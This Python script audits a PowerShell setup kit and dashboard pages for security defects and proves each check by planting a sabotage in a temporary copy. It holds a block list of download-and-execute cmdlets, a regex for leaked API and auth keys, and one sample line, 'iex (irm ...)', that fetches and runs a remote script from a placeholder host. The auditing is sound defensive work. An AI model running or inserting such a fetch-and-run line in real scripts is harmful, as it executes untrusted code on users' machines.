#!/usr/bin/env python3
"""Security invariants for the one-click kit and Command Center pages.

  python3 tools/command-center/audit_check.py [root]      exit 0 = all safe
  python3 tools/command-center/audit_check.py --prove     sabotages a throwaway copy once per check
                                                          and requires each check to go red

Each check is named after the defect it guards against.
"""
import json, re, sys, shutil, tempfile, pathlib

CHECKS = []
def check(fn): CHECKS.append(fn); return fn

def ps_files(r): return sorted((r / 'kit').rglob('*.ps1'))
def text_files(r):
    out = []
    for d in ['kit', 'tools/command-center', 'sites/grace-command-center', 'sites/command-center-template']:
        out += [p for p in (r / d).rglob('*') if p.is_file() and p.suffix in {'.ps1', '.cmd', '.json', '.html', '.py'}]
    return out

@check
def kit_never_runs_downloaded_code(r):
    """Piping a downloaded script into PowerShell would run whatever the server sends that day."""
    bad = re.compile(r'\b(iex|Invoke-Expression|irm|Invoke-RestMethod|DownloadString|Invoke-WebRequest)\b', re.I)
    return [f'{p}: {m.group(0)}' for p in ps_files(r) for line in re.sub(r'<#.*?#>', '', p.read_text(), flags=re.S).splitlines()
            if not line.lstrip().startswith('#') for m in [bad.search(line)] if m]

@check
def winget_installs_are_exact_and_from_the_official_source(r):
    """Without --exact and --source winget, a look-alike package name could be installed instead."""
    errs = []
    for p in ps_files(r):
        for line in p.read_text().splitlines():
            if re.match(r'\s*winget install', line):
                for need in ('--exact', '--source winget', '--id'):
                    if need not in line: errs.append(f'{p}: winget install missing {need}')
    for k in (r / 'kit').rglob('kit.json'):
        for a in json.loads(k.read_text())['apps']:
            if 'winget' in a and not re.fullmatch(r'[A-Za-z0-9][A-Za-z0-9.\-]+', a['winget']): errs.append(f'{k}: bad id {a["winget"]}')
            if 'page' in a and not a['page'].startswith('https://'): errs.append(f'{k}: non-https page {a["page"]}')
    return errs

@check
def no_secrets_or_auth_keys_are_shipped(r):
    """A baked-in Tailscale auth key or API key would let anyone with the file join the network or spend money."""
    pat = re.compile(r'(tskey-[A-Za-z0-9]|sk-ant-[A-Za-z0-9]|sk-[A-Za-z0-9]{20,}|--auth-?key|AKIA[0-9A-Z]{16}|xox[bp]-|ghp_[A-Za-z0-9]{20,}|\d{8,10}:AA[A-Za-z0-9_-]{30,})')
    return [f'{p}: {m.group(0)[:12]}' for p in text_files(r) if p.name != 'audit_check.py' for m in [pat.search(p.read_text(errors='ignore'))] if m]

@check
def remote_help_is_off_after_setup(r):
    """Setup must leave Tailscale down; only remote-help.ps1 -On (pressed by the client) may bring it up."""
    errs = []
    s = (r / 'kit' / 'setup.ps1').read_text()
    if re.search(r'&\s*\$ts\s+up', s): errs.append('setup.ps1 brings Tailscale up')
    if not re.search(r'&\s*\$ts\s+down', s): errs.append('setup.ps1 does not take Tailscale down')
    h = (r / 'kit' / 'remote-help.ps1').read_text()
    if 'Register-ScheduledTask' not in h or 'ValidateRange(5, 240)' not in h: errs.append('remote-help.ps1 has no bounded auto-off')
    return errs

@check
def setup_asks_before_changing_anything(r):
    """The client must type YES before the first change; anything else exits with nothing changed."""
    s = (r / 'kit' / 'setup.ps1').read_text()
    a, b = s.find("Read-Host \"  Type YES"), s.find('winget install')
    return [] if 0 <= a < b and "-ne 'YES'" in s else ['no YES consent before the first install']

@check
def template_carries_no_client_names(r):
    """The resale template must not leak Grace's or PEPTICITY's details to the next buyer."""
    errs = []
    for p in [r / 'sites/command-center-template/index.html', *(r / 'kit/template').rglob('*')]:
        if p.is_file():
            for w in ('PEPTICITY', 'Grace', 'APEX 360', 'BPC-157', 'Gracet@'):
                if w in p.read_text(errors='ignore'): errs.append(f'{p}: {w}')
    return errs

@check
def page_links_cannot_hijack_the_opener(r):
    """target=_blank without rel=noopener lets the opened site rewrite the Command Center tab."""
    errs = []
    for p in [r / 'tools/command-center/src.html']:
        s = p.read_text()
        for m in re.finditer(r'<a [^>]*target="_blank"[^>]*>', s):
            if 'noopener' not in m.group(0): errs.append(f'{p}: {m.group(0)[:60]}')
    return errs

@check
def page_escapes_config_text(r):
    """Config strings go into innerHTML; without esc() a value with <script> would run in the page."""
    s = (r / 'tools/command-center/src.html').read_text()
    html_lines = '\n'.join(l for l in s.splitlines() if 'innerHTML' in l)   # only text written as HTML can inject
    raw = re.findall(r"\+\s*(?:n|k|l|s|a|r|m|x|p)\.(?:t|s|v|d|l|n|why|cost|time|name|size|detail|body|when|url)\s*\+", html_lines)
    return [f'unescaped {x.strip()}' for x in raw]

@check
def page_scripts_come_from_pinned_cdn_with_integrity(r):
    """three.js loads from a CDN; an unpinned or unhashed URL could be swapped under us."""
    s = (r / 'sites/grace-command-center/index.html').read_text()
    m = re.search(r'<script type="importmap">(.*?)</script>', s, re.S)
    if not m: return ['no importmap']
    im = json.loads(m.group(1)); errs = []
    for k, u in im['imports'].items():
        if not re.search(r'@\d+\.\d+\.\d+/', u): errs.append(f'unpinned {u}')
    for u in re.findall(r'import [^;]*?from \'(three[^\']*)\'', s):
        full = im['imports']['three'] if u == 'three' else u.replace('three/addons/', im['imports']['three/addons/'])
        if full not in im.get('integrity', {}): errs.append(f'no integrity hash for {full}')
    return errs


def run(root):
    bad = 0
    for c in CHECKS:
        e = c(root)
        print(('BROKEN ' if e else 'safe   ') + c.__name__ + ('' if not e else '  ->  ' + '; '.join(e[:3])))
        bad += bool(e)
    return bad


SABOTAGE = {   # check -> (file, old, new): one injected defect per check
    'kit_never_runs_downloaded_code': ('kit/setup.ps1', "Clear-Host", "iex (irm https://example.com/x.ps1)\nClear-Host"),
    'winget_installs_are_exact_and_from_the_official_source': ('kit/setup.ps1', '--exact --source winget ', ''),
    'no_secrets_or_auth_keys_are_shipped': ('kit/grace/kit.json', '"client"', '"key": "tskey-auth-kAbCdEf123", "client"'),
    'remote_help_is_off_after_setup': ('kit/setup.ps1', '& $ts down', '& $ts up'),
    'setup_asks_before_changing_anything': ('kit/setup.ps1', "-ne 'YES'", "-ne 'NO'"),
    'template_carries_no_client_names': ('sites/command-center-template/index.html', '</footer>', 'Grace</footer>'),
    'page_links_cannot_hijack_the_opener': ('tools/command-center/src.html', 'rel="noopener noreferrer"', ''),
    'page_escapes_config_text': ('tools/command-center/src.html', "esc(s.t)+'<small>'", "s.t+'<small>'"),
    'page_scripts_come_from_pinned_cdn_with_integrity': ('sites/grace-command-center/index.html', 'three@0.160.0/build', 'three@latest/build'),
}

def prove(root):
    failed = 0
    for c in CHECKS:
        f, old, new = SABOTAGE[c.__name__]
        with tempfile.TemporaryDirectory() as td:
            t = pathlib.Path(td)
            for d in ['kit', 'tools/command-center', 'sites/grace-command-center', 'sites/command-center-template']:
                shutil.copytree(root / d, t / d)
            p = t / f; s = p.read_text()
            assert old in s, f'stale sabotage anchor for {c.__name__}: {old!r}'
            p.write_text(s.replace(old, new, 1))
            caught = bool(c(t))
        print(('caught  ' if caught else 'MISSED  ') + c.__name__)
        failed += not caught
    return failed


if __name__ == '__main__':
    root = pathlib.Path(__file__).resolve().parents[2]
    if '--prove' in sys.argv:
        sys.exit(1 if prove(root) else 0)
    sys.exit(1 if run(pathlib.Path(sys.argv[1]) if len(sys.argv) > 1 else root) else 0)
